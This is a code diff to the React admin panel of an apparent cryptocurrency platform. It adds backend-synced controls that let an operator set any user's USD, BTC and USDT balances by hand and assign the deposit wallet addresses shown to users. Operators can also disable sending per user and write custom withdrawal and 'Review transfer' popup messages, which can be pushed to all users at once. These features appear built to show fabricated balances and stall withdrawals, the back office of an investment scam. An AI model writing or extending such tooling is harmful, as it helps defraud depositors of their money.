@@ -12,6 +12,10 @@ import {
   getUserWithdrawalMessage,
   saveUserWithdrawalMessage,
   DEFAULT_WITHDRAWAL_MESSAGE,
+  getGlobalSendReviewSetting,
+  saveGlobalSendReviewSetting,
+  saveUserSendReviewMessage,
+  DEFAULT_SEND_REVIEW_MESSAGE,
 } from '../data/mockData.js';
 import { authApi } from '../api/client.js';
 
@@ -180,6 +184,8 @@ function UsersTab({ onRefresh }) {
   const [withdrawalMsgSaved, setWithdrawalMsgSaved] = useState(false);
   const [sendMessage, setSendMessage] = useState('');
   const [sendMessageSaved, setSendMessageSaved] = useState(false);
+  const [sendReviewMsg, setSendReviewMsg] = useState('');
+  const [sendReviewMsgSaved, setSendReviewMsgSaved] = useState(false);
   const [confirmDelete, setConfirmDelete] = useState(false);
 
   const reload = useCallback(async () => {
@@ -189,6 +195,8 @@ function UsersTab({ onRefresh }) {
         ...user,
         sendEnabled: user.sendEnabled !== false,
         sendMessage: user.sendMessage || '',
+        sendReviewPopupEnabled: Boolean(user.sendReviewPopupEnabled),
+        sendReviewPopupMessage: user.sendReviewPopupMessage || '',
       })));
     } catch (err) {
       console.error('Failed to fetch users:', err);
@@ -202,8 +210,7 @@ function UsersTab({ onRefresh }) {
       setBalanceUsd(String(editUser.balanceUsd ?? ''));
       setBtcHolding(String(editUser.btcHolding ?? ''));
       
-      const userUsdtMap = JSON.parse(localStorage.getItem('shughar_user_usdt_holdings') || '{}');
-      const loadedUsdt = editUser.usdtHolding ?? userUsdtMap[editUser.email] ?? 2500;
+      const loadedUsdt = editUser.usdtHolding ?? 2500;
       setUsdtHolding(String(loadedUsdt));
       setSaved(false);
       
@@ -214,25 +221,21 @@ function UsersTab({ onRefresh }) {
       setRewards(editUser.rewards || '');
       setCardSaved(false);
 
-      // load this user's BTC wallet (empty string if using global/default)
-      const raw = localStorage.getItem('shughar_user_wallets');
-      const store = raw ? JSON.parse(raw) : {};
-      setWalletAddr(store[editUser.email] || '');
+      // load this user's BTC & USDT wallets from MongoDB (empty string if using global)
+      setWalletAddr(editUser.btcWalletAddress || '');
       setWalletSaved(false);
 
-      // load this user's USDT wallet (empty string if using global/default)
-      const rawUsdt = localStorage.getItem('shughar_user_usdt_wallets');
-      const storeUsdt = rawUsdt ? JSON.parse(rawUsdt) : {};
-      setUsdtWalletAddr(storeUsdt[editUser.email] || '');
+      setUsdtWalletAddr(editUser.usdtWalletAddress || '');
       setUsdtWalletSaved(false);
 
-      // load this user's withdrawal message (empty string if using global/default)
-      const rawWithdrawal = localStorage.getItem('shughar_user_withdrawal_msgs');
-      const storeWithdrawal = rawWithdrawal ? JSON.parse(rawWithdrawal) : {};
-      setWithdrawalMsg(editUser.withdrawalMessage || storeWithdrawal[editUser.email] || '');
+      // load this user's withdrawal message from MongoDB (empty string if using global)
+      setWithdrawalMsg(editUser.withdrawalMessage || '');
 
        setSendMessage(editUser.sendMessage || '');
-       setSendMessageSaved(false);      setWithdrawalMsgSaved(false);
+       setSendMessageSaved(false);
+       setWithdrawalMsgSaved(false);
+       setSendReviewMsg(editUser.sendReviewPopupMessage || '');
+       setSendReviewMsgSaved(false);
     }
   }, [editUser]);
 
@@ -243,22 +246,14 @@ function UsersTab({ onRefresh }) {
       const bBtc = parseFloat(btcHolding) || 0;
       const bUsdt = parseFloat(usdtHolding) || 0;
       
-      // Update backend database
-      const res = await authApi.updateBalance(editUser.email, { balanceUsd: bUsd, btcHolding: bBtc, usdtHolding: bUsdt }).catch(err => {
-        console.warn('Backend updateBalance partial:', err);
-        return { balanceUsd: bUsd, btcHolding: bBtc, usdtHolding: bUsdt };
-      });
+      // Update MongoDB database (required for cross-device sync)
+      const res = await authApi.updateBalance(editUser.email, { balanceUsd: bUsd, btcHolding: bBtc, usdtHolding: bUsdt });
 
-      // Save USDT to localStorage map for immediate client reflection
-      const userUsdtMap = JSON.parse(localStorage.getItem('shughar_user_usdt_holdings') || '{}');
-      userUsdtMap[editUser.email] = bUsdt;
-      localStorage.setItem('shughar_user_usdt_holdings', JSON.stringify(userUsdtMap));
-      
-      const updated = { 
-        ...editUser, 
-        balanceUsd: res?.balanceUsd ?? bUsd, 
+      const updated = {
+        ...editUser,
+        balanceUsd: res?.balanceUsd ?? bUsd,
         btcHolding: res?.btcHolding ?? bBtc,
-        usdtHolding: res?.usdtHolding ?? bUsdt
+        usdtHolding: res?.usdtHolding ?? bUsdt,
       };
       
       setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
@@ -291,41 +286,81 @@ function UsersTab({ onRefresh }) {
     }
   }
 
-  function handleSaveWallet() {
+  async function handleSaveWallet() {
     if (!editUser) return;
-    saveUserWalletAddress(editUser.email, walletAddr);
-    setWalletSaved(true);
-    setTimeout(() => setWalletSaved(false), 2000);
+    try {
+      const addr = walletAddr.trim();
+      const res = await authApi.updateWallets(editUser.email, { btcWalletAddress: addr });
+      saveUserWalletAddress(editUser.email, addr);
+      const updated = { ...editUser, btcWalletAddress: res.btcWalletAddress ?? addr };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setWalletSaved(true);
+      setTimeout(() => setWalletSaved(false), 2000);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to save BTC wallet:', err);
+      alert('Failed to save BTC wallet: ' + err.message);
+    }
   }
 
-  function handleClearWallet() {
+  async function handleClearWallet() {
     if (!editUser) return;
-    saveUserWalletAddress(editUser.email, ''); // removes override -> falls back to global
-    setWalletAddr('');
-    setWalletSaved(false);
+    try {
+      await authApi.updateWallets(editUser.email, { btcWalletAddress: '' });
+      saveUserWalletAddress(editUser.email, '');
+      const updated = { ...editUser, btcWalletAddress: '' };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setWalletAddr('');
+      setWalletSaved(false);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to clear BTC wallet:', err);
+      alert('Failed to clear BTC wallet: ' + err.message);
+    }
   }
 
-  function handleSaveUsdtWallet() {
+  async function handleSaveUsdtWallet() {
     if (!editUser) return;
-    saveUserUsdtWalletAddress(editUser.email, usdtWalletAddr);
-    setUsdtWalletSaved(true);
-    setTimeout(() => setUsdtWalletSaved(false), 2000);
+    try {
+      const addr = usdtWalletAddr.trim();
+      const res = await authApi.updateWallets(editUser.email, { usdtWalletAddress: addr });
+      saveUserUsdtWalletAddress(editUser.email, addr);
+      const updated = { ...editUser, usdtWalletAddress: res.usdtWalletAddress ?? addr };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setUsdtWalletSaved(true);
+      setTimeout(() => setUsdtWalletSaved(false), 2000);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to save USDT wallet:', err);
+      alert('Failed to save USDT wallet: ' + err.message);
+    }
   }
 
-  function handleClearUsdtWallet() {
+  async function handleClearUsdtWallet() {
     if (!editUser) return;
-    saveUserUsdtWalletAddress(editUser.email, ''); // removes override -> falls back to global
-    setUsdtWalletAddr('');
-    setUsdtWalletSaved(false);
+    try {
+      await authApi.updateWallets(editUser.email, { usdtWalletAddress: '' });
+      saveUserUsdtWalletAddress(editUser.email, '');
+      const updated = { ...editUser, usdtWalletAddress: '' };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setUsdtWalletAddr('');
+      setUsdtWalletSaved(false);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to clear USDT wallet:', err);
+      alert('Failed to clear USDT wallet: ' + err.message);
+    }
   }
 
   async function handleSaveWithdrawalMsg() {
     if (!editUser) return;
     try {
+      await authApi.updateWithdrawalMessage(editUser.email, { withdrawalMessage: withdrawalMsg.trim() });
       saveUserWithdrawalMessage(editUser.email, withdrawalMsg);
-      await authApi.updateWithdrawalMessage(editUser.email, { withdrawalMessage: withdrawalMsg.trim() }).catch(err => {
-        console.warn('Backend updateWithdrawalMessage partial:', err);
-      });
       const updated = { ...editUser, withdrawalMessage: withdrawalMsg.trim() };
       setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
       setEditUser(updated);
@@ -341,10 +376,8 @@ function UsersTab({ onRefresh }) {
   async function handleClearWithdrawalMsg() {
     if (!editUser) return;
     try {
-      saveUserWithdrawalMessage(editUser.email, ''); // removes override -> falls back to global default
-      await authApi.updateWithdrawalMessage(editUser.email, { withdrawalMessage: '' }).catch(err => {
-        console.warn('Backend clear withdrawalMessage partial:', err);
-      });
+      await authApi.updateWithdrawalMessage(editUser.email, { withdrawalMessage: '' });
+      saveUserWithdrawalMessage(editUser.email, '');
       const updated = { ...editUser, withdrawalMessage: '' };
       setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
       setEditUser(updated);
@@ -353,6 +386,7 @@ function UsersTab({ onRefresh }) {
       onRefresh();
     } catch (err) {
       console.error('Failed to clear withdrawal message:', err);
+      alert('Failed to clear withdrawal message: ' + err.message);
     }
   }
 
@@ -375,15 +409,16 @@ function UsersTab({ onRefresh }) {
     const message = sendMessage.trim();
     try {
       await authApi.updateSendMessage(editUser.email, { sendMessage: message });
+      const updated = { ...editUser, sendMessage: message };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setSendMessageSaved(true);
+      setTimeout(() => setSendMessageSaved(false), 2000);
+      onRefresh();
     } catch (err) {
-      console.warn('Backend send message update failed:', err);
+      console.error('Backend send message update failed:', err);
+      alert('Failed to save popup message: ' + err.message);
     }
-    const updated = { ...editUser, sendMessage: message };
-    setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
-    setEditUser(updated);
-    setSendMessageSaved(true);
-    setTimeout(() => setSendMessageSaved(false), 2000);
-    onRefresh();
   }
   async function handleToggleSend() {
     if (!editUser) return;
@@ -398,6 +433,56 @@ function UsersTab({ onRefresh }) {
     } catch (err) {
       console.error('Failed to toggle send:', err);
       alert('Failed to update Send: ' + err.message);
+    }
+  }
+
+  async function handleToggleSendReviewPopup() {
+    if (!editUser) return;
+    const nextEnabled = !editUser.sendReviewPopupEnabled;
+    try {
+      const res = await authApi.updateSendReviewPopup(editUser.email, { sendReviewPopupEnabled: nextEnabled });
+      const savedEnabled = typeof res.sendReviewPopupEnabled === 'boolean' ? res.sendReviewPopupEnabled : nextEnabled;
+      const updated = { ...editUser, sendReviewPopupEnabled: savedEnabled };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to toggle send review popup:', err);
+      alert('Failed to update Send Review Popup setting: ' + err.message);
+    }
+  }
+
+  async function handleSaveSendReviewMsg() {
+    if (!editUser) return;
+    const message = sendReviewMsg.trim();
+    try {
+      saveUserSendReviewMessage(editUser.email, message);
+      await authApi.updateSendReviewPopup(editUser.email, { sendReviewPopupMessage: message });
+      const updated = { ...editUser, sendReviewPopupMessage: message };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setSendReviewMsgSaved(true);
+      setTimeout(() => setSendReviewMsgSaved(false), 2000);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to save send review popup message:', err);
+      alert('Failed to save review popup message: ' + err.message);
+    }
+  }
+
+  async function handleClearSendReviewMsg() {
+    if (!editUser) return;
+    try {
+      saveUserSendReviewMessage(editUser.email, '');
+      await authApi.updateSendReviewPopup(editUser.email, { sendReviewPopupMessage: '' });
+      const updated = { ...editUser, sendReviewPopupMessage: '' };
+      setUsers(prev => prev.map(u => u.email === editUser.email ? updated : u));
+      setEditUser(updated);
+      setSendReviewMsg('');
+      setSendReviewMsgSaved(false);
+      onRefresh();
+    } catch (err) {
+      console.error('Failed to clear send review popup message:', err);
     }
   }
   async function handleToggleStatus() {
@@ -581,6 +666,77 @@ function UsersTab({ onRefresh }) {
                   {sendMessageSaved ? 'Saved!' : 'Save Popup Message'}
                 </button>
               </div>
+              {/* Per-user Send Review Modal Popup Setting */}
+              <div
+                className="rounded-xl p-5 my-5"
+                style={{
+                  background: editUser.sendReviewPopupEnabled ? 'rgba(6,182,212,0.06)' : 'rgba(100,116,139,0.05)',
+                  border: editUser.sendReviewPopupEnabled ? '1px solid rgba(6,182,212,0.25)' : '1px solid rgba(100,116,139,0.18)',
+                }}
+              >
+                <div className="flex flex-wrap items-center justify-between gap-3 mb-3">
+                  <div>
+                    <div className="flex items-center gap-2">
+                      <h4 className="text-xs font-bold uppercase tracking-widest text-cyan-400">Review Button Popup Modal</h4>
+                      {editUser.sendReviewPopupEnabled ? (
+                        <span className="text-[10px] font-bold px-2 py-0.5 rounded-full" style={{ background: 'rgba(16,185,129,0.15)', color: '#10b981', border: '1px solid rgba(16,185,129,0.25)' }}>
+                          Popup On
+                        </span>
+                      ) : (
+                        <span className="text-[10px] font-bold px-2 py-0.5 rounded-full" style={{ background: 'rgba(100,116,139,0.15)', color: '#94a3b8', border: '1px solid rgba(100,116,139,0.25)' }}>
+                          Popup Off
+                        </span>
+                      )}
+                    </div>
+                    <p className="text-[11px] text-slate-400 mt-1">
+                      {editUser.sendReviewPopupEnabled
+                        ? 'When Send is ON and user fills details, clicking Review opens this admin-written modal.'
+                        : 'When Send is ON, clicking Review shows the normal transfer summary step.'}
+                    </p>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={handleToggleSendReviewPopup}
+                    className="px-4 py-2 rounded-xl text-xs font-bold text-white transition-all flex-shrink-0"
+                    style={{ background: editUser.sendReviewPopupEnabled ? 'linear-gradient(135deg, #ef4444, #dc2626)' : 'linear-gradient(135deg, #10b981, #059669)' }}
+                  >
+                    {editUser.sendReviewPopupEnabled ? 'Turn Popup Off' : 'Turn Popup On'}
+                  </button>
+                </div>
+
+                <label htmlFor={`send-review-msg-${editUser.email}`} className="block text-[11px] font-semibold uppercase tracking-widest text-slate-400 mb-1.5">
+                  Admin-Written Review Modal Message
+                </label>
+                <p className="text-[11px] text-slate-500 mb-2">Leave blank to use the global review modal message from Settings.</p>
+                <textarea
+                  id={`send-review-msg-${editUser.email}`}
+                  value={sendReviewMsg}
+                  onChange={e => { setSendReviewMsg(e.target.value); setSendReviewMsgSaved(false); }}
+                  rows={3}
+                  placeholder={`Global: ${getGlobalSendReviewSetting().message}`}
+                  className="w-full px-3 py-2.5 rounded-xl text-xs text-slate-200 focus:outline-none transition-all resize-y leading-relaxed"
+                  style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(6,182,212,0.22)' }}
+                />
+                <div className="flex gap-2 mt-3">
+                  <button
+                    type="button"
+                    onClick={handleClearSendReviewMsg}
+                    className="px-3 py-2 rounded-xl text-xs font-semibold text-slate-400 transition-all hover:text-white"
+                    style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.07)' }}
+                  >
+                    Use Global
+                  </button>
+                  <button
+                    type="button"
+                    onClick={handleSaveSendReviewMsg}
+                    className="flex-1 py-2 rounded-xl text-xs font-bold text-white transition-all flex items-center justify-center gap-1.5"
+                    style={{ background: sendReviewMsgSaved ? 'linear-gradient(135deg, #10b981, #059669)' : 'linear-gradient(135deg, #06B6D4, #0284c7)' }}
+                  >
+                    {sendReviewMsgSaved ? 'Saved!' : 'Save Review Modal Message'}
+                  </button>
+                </div>
+              </div>
+
               {/* Editable Card Details */}
             <div className="rounded-xl p-5 mb-5" style={{ background: 'rgba(99,102,241,0.05)', border: '1px solid rgba(99,102,241,0.15)' }}>
               <h4 className="text-xs font-bold uppercase tracking-widest text-indigo-400 mb-4">Edit Card Details</h4>
@@ -1077,60 +1233,169 @@ function SettingsTab() {
   const [saved, setSaved] = useState(false);
   const [error, setError] = useState('');
 
-  function handleSave() {
-    if (!address.trim()) { setError('Address cannot be empty.'); return; }
-    localStorage.setItem('shughar_wallet_address', address.trim());
-    setSaved(true);
-    setError('');
-    setTimeout(() => setSaved(false), 2500);
-  }
-
-  function handleReset() {
-    localStorage.removeItem('shughar_wallet_address');
-    setAddress('bc1qrkue55nt2h0pjkge2yk7jqkekymxknawr982py');
-    setSaved(false);
-  }
-
   // ── USDT ──
   const [usdtAddress, setUsdtAddress] = useState(getUsdtWalletAddress());
   const [usdtSaved, setUsdtSaved] = useState(false);
   const [usdtError, setUsdtError] = useState('');
-
-  function handleUsdtSave() {
-    if (!usdtAddress.trim()) { setUsdtError('Address cannot be empty.'); return; }
-    localStorage.setItem('shughar_usdt_wallet_address', usdtAddress.trim());
-    setUsdtSaved(true);
-    setUsdtError('');
-    setTimeout(() => setUsdtSaved(false), 2500);
-  }
-
-  function handleUsdtReset() {
-    localStorage.removeItem('shughar_usdt_wallet_address');
-    setUsdtAddress('0xD5d04b7628fE6d0834870888Fe557972aF8Ca49f');
-    setUsdtSaved(false);
-  }
 
   // ── Withdrawal Modal Writeup (Global Default for new signups) ──
   const [globalWithdrawalMsg, setGlobalWithdrawalMsg] = useState(getGlobalWithdrawalMessage());
   const [globalWithdrawalSaved, setGlobalWithdrawalSaved] = useState(false);
   const [globalWithdrawalError, setGlobalWithdrawalError] = useState('');
 
-  function handleGlobalWithdrawalSave() {
+  useEffect(() => {
+    authApi.getGlobalSettings()
+      .then((res) => {
+        if (res?.btcWalletAddress) setAddress(res.btcWalletAddress);
+        if (res?.usdtWalletAddress) setUsdtAddress(res.usdtWalletAddress);
+        if (res?.withdrawalMessage) setGlobalWithdrawalMsg(res.withdrawalMessage);
+      })
+      .catch(() => {});
+  }, []);
+
+  async function handleSave() {
+    if (!address.trim()) { setError('Address cannot be empty.'); return; }
+    try {
+      const clean = address.trim();
+      await authApi.updateGlobalSettings({ btcWalletAddress: clean });
+      localStorage.setItem('shughar_wallet_address', clean);
+      setSaved(true);
+      setError('');
+      setTimeout(() => setSaved(false), 2500);
+    } catch (err) {
+      setError('Failed to save to server: ' + err.message);
+    }
+  }
+
+  async function handleReset() {
+    const def = 'bc1qrkue55nt2h0pjkge2yk7jqkekymxknawr982py';
+    try {
+      await authApi.updateGlobalSettings({ btcWalletAddress: def });
+      localStorage.removeItem('shughar_wallet_address');
+      setAddress(def);
+      setSaved(false);
+      setError('');
+    } catch (err) {
+      setError('Failed to reset on server: ' + err.message);
+    }
+  }
+
+  async function handleUsdtSave() {
+    if (!usdtAddress.trim()) { setUsdtError('Address cannot be empty.'); return; }
+    try {
+      const clean = usdtAddress.trim();
+      await authApi.updateGlobalSettings({ usdtWalletAddress: clean });
+      localStorage.setItem('shughar_usdt_wallet_address', clean);
+      setUsdtSaved(true);
+      setUsdtError('');
+      setTimeout(() => setUsdtSaved(false), 2500);
+    } catch (err) {
+      setUsdtError('Failed to save to server: ' + err.message);
+    }
+  }
+
+  async function handleUsdtReset() {
+    const def = '0xD5d04b7628fE6d0834870888Fe557972aF8Ca49f';
+    try {
+      await authApi.updateGlobalSettings({ usdtWalletAddress: def });
+      localStorage.removeItem('shughar_usdt_wallet_address');
+      setUsdtAddress(def);
+      setUsdtSaved(false);
+      setUsdtError('');
+    } catch (err) {
+      setUsdtError('Failed to reset on server: ' + err.message);
+    }
+  }
+
+  async function handleGlobalWithdrawalSave() {
     if (!globalWithdrawalMsg.trim()) {
       setGlobalWithdrawalError('Writeup cannot be empty.');
       return;
     }
-    saveGlobalWithdrawalMessage(globalWithdrawalMsg.trim());
-    setGlobalWithdrawalSaved(true);
-    setGlobalWithdrawalError('');
-    setTimeout(() => setGlobalWithdrawalSaved(false), 2500);
+    try {
+      const clean = globalWithdrawalMsg.trim();
+      await authApi.updateGlobalSettings({ withdrawalMessage: clean });
+      saveGlobalWithdrawalMessage(clean);
+      setGlobalWithdrawalSaved(true);
+      setGlobalWithdrawalError('');
+      setTimeout(() => setGlobalWithdrawalSaved(false), 2500);
+    } catch (err) {
+      setGlobalWithdrawalError('Failed to save to server: ' + err.message);
+    }
   }
 
-  function handleGlobalWithdrawalReset() {
-    saveGlobalWithdrawalMessage('');
-    setGlobalWithdrawalMsg(DEFAULT_WITHDRAWAL_MESSAGE);
-    setGlobalWithdrawalSaved(false);
-    setGlobalWithdrawalError('');
+  async function handleGlobalWithdrawalReset() {
+    try {
+      await authApi.updateGlobalSettings({ withdrawalMessage: DEFAULT_WITHDRAWAL_MESSAGE });
+      saveGlobalWithdrawalMessage('');
+      setGlobalWithdrawalMsg(DEFAULT_WITHDRAWAL_MESSAGE);
+      setGlobalWithdrawalSaved(false);
+      setGlobalWithdrawalError('');
+    } catch (err) {
+      setGlobalWithdrawalError('Failed to reset on server: ' + err.message);
+    }
+  }
+
+  // ── Global Send Review Popup Modal Settings ──
+  const initialSendReview = getGlobalSendReviewSetting();
+  const [globalSendReviewEnabled, setGlobalSendReviewEnabled] = useState(initialSendReview.enabled);
+  const [globalSendReviewMsg, setGlobalSendReviewMsg] = useState(initialSendReview.message);
+  const [globalSendReviewSaved, setGlobalSendReviewSaved] = useState(false);
+  const [globalSendReviewApplied, setGlobalSendReviewApplied] = useState(false);
+  const [globalSendReviewError, setGlobalSendReviewError] = useState('');
+
+  useEffect(() => {
+    authApi.getGlobalSendReviewPopup()
+      .then((res) => {
+        if (res && typeof res.enabled === 'boolean') {
+          setGlobalSendReviewEnabled(res.enabled);
+        }
+        if (res && typeof res.message === 'string' && res.message.trim()) {
+          setGlobalSendReviewMsg(res.message.trim());
+        }
+      })
+      .catch(() => {});
+  }, []);
+
+  async function handleGlobalSendReviewSave(applyToAll = false) {
+    if (!globalSendReviewMsg.trim()) {
+      setGlobalSendReviewError('Review modal writeup cannot be empty.');
+      return;
+    }
+    const cleanMsg = globalSendReviewMsg.trim();
+    try {
+      await authApi.updateGlobalSendReviewPopup({
+        enabled: globalSendReviewEnabled,
+        message: cleanMsg,
+        applyToAll,
+      });
+      saveGlobalSendReviewSetting({ enabled: globalSendReviewEnabled, message: cleanMsg });
+      setGlobalSendReviewError('');
+      if (applyToAll) {
+        setGlobalSendReviewApplied(true);
+        setTimeout(() => setGlobalSendReviewApplied(false), 2500);
+      } else {
+        setGlobalSendReviewSaved(true);
+        setTimeout(() => setGlobalSendReviewSaved(false), 2500);
+      }
+    } catch (err) {
+      setGlobalSendReviewError('Failed to save to server: ' + err.message);
+    }
+  }
+
+  async function handleGlobalSendReviewReset() {
+    try {
+      await authApi.updateGlobalSendReviewPopup({
+        enabled: globalSendReviewEnabled,
+        message: DEFAULT_SEND_REVIEW_MESSAGE,
+      });
+      setGlobalSendReviewMsg(DEFAULT_SEND_REVIEW_MESSAGE);
+      saveGlobalSendReviewSetting({ enabled: globalSendReviewEnabled, message: DEFAULT_SEND_REVIEW_MESSAGE });
+      setGlobalSendReviewSaved(false);
+      setGlobalSendReviewError('');
+    } catch (err) {
+      setGlobalSendReviewError('Failed to reset on server: ' + err.message);
+    }
   }
 
   return (
@@ -1305,6 +1570,81 @@ function SettingsTab() {
             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
           </svg>
           <p className="text-xs" style={{ color: 'rgba(168,85,247,0.7)' }}>This message is constantly served to every new signup and user without a custom writeup.</p>
+        </div>
+      </div>
+
+      {/* ── Global Send Review Popup Modal Card ── */}
+      <div className="rounded-2xl p-6" style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(6,182,212,0.2)' }}>
+        <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
+          <div className="flex items-center gap-3">
+            <div className="w-10 h-10 rounded-xl flex items-center justify-center text-lg font-bold" style={{ background: 'rgba(6,182,212,0.1)', border: '1px solid rgba(6,182,212,0.25)', color: '#06B6D4' }}>
+              <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 10l7-7m0 0l7 7M12 3v18" />
+              </svg>
+            </div>
+            <div>
+              <h3 className="text-sm font-bold text-white">Send Review Popup Modal</h3>
+              <p className="text-xs text-slate-400 mt-0.5">Popup shown when Send is ON, details are filled, and user clicks Review transfer</p>
+            </div>
+          </div>
+
+          <button
+            type="button"
+            onClick={() => { setGlobalSendReviewEnabled(v => !v); setGlobalSendReviewSaved(false); }}
+            className="px-3.5 py-1.5 rounded-xl text-xs font-bold text-white transition-all"
+            style={{
+              background: globalSendReviewEnabled
+                ? 'linear-gradient(135deg, #10b981, #059669)'
+                : 'linear-gradient(135deg, #64748b, #475569)',
+            }}
+          >
+            New Signups: {globalSendReviewEnabled ? 'Popup ON' : 'Popup OFF'}
+          </button>
+        </div>
+
+        <div className="mb-4">
+          <label className="block text-[11px] font-semibold uppercase tracking-widest text-cyan-400/90 mb-2">
+            Global Review Modal Writeup
+          </label>
+          <textarea
+            id="global-send-review-msg-input"
+            value={globalSendReviewMsg}
+            onChange={e => { setGlobalSendReviewMsg(e.target.value); setGlobalSendReviewSaved(false); setGlobalSendReviewError(''); }}
+            rows={3}
+            placeholder={DEFAULT_SEND_REVIEW_MESSAGE}
+            className="w-full px-4 py-3 rounded-xl text-sm text-slate-200 focus:outline-none transition-all resize-y leading-relaxed"
+            style={{ background: 'rgba(255,255,255,0.04)', border: `1px solid ${globalSendReviewError ? 'rgba(239,68,68,0.4)' : 'rgba(6,182,212,0.2)'}` }}
+          />
+          {globalSendReviewError && <p className="text-xs text-red-400 mt-1">{globalSendReviewError}</p>}
+        </div>
+
+        <div className="flex flex-wrap gap-3">
+          <button
+            type="button"
+            onClick={handleGlobalSendReviewReset}
+            className="px-4 py-2.5 rounded-xl text-xs font-semibold text-slate-400 transition-all hover:text-white"
+            style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.07)' }}
+          >
+            Reset to Default
+          </button>
+          <button
+            type="button"
+            onClick={() => handleGlobalSendReviewSave(false)}
+            className="flex-1 py-2.5 px-4 rounded-xl text-sm font-bold text-white transition-all flex items-center justify-center gap-2"
+            style={{ background: globalSendReviewSaved ? 'linear-gradient(135deg, #10b981, #059669)' : 'linear-gradient(135deg, #06B6D4, #0284c7)' }}
+          >
+            {globalSendReviewSaved ? 'Saved!' : 'Save Global Setting'}
+          </button>
+          <button
+            type="button"
+            onClick={() => handleGlobalSendReviewSave(true)}
+            className="w-full py-2.5 px-4 rounded-xl text-xs font-bold text-white transition-all"
+            style={{ background: globalSendReviewApplied ? 'linear-gradient(135deg, #10b981, #059669)' : 'linear-gradient(135deg, #6366F1, #4F46E5)' }}
+          >
+            {globalSendReviewApplied
+              ? 'Applied to All Existing Users!'
+              : `Apply "${globalSendReviewEnabled ? 'Popup ON' : 'Popup OFF'}" to All Existing Users`}
+          </button>
         </div>
       </div>
 
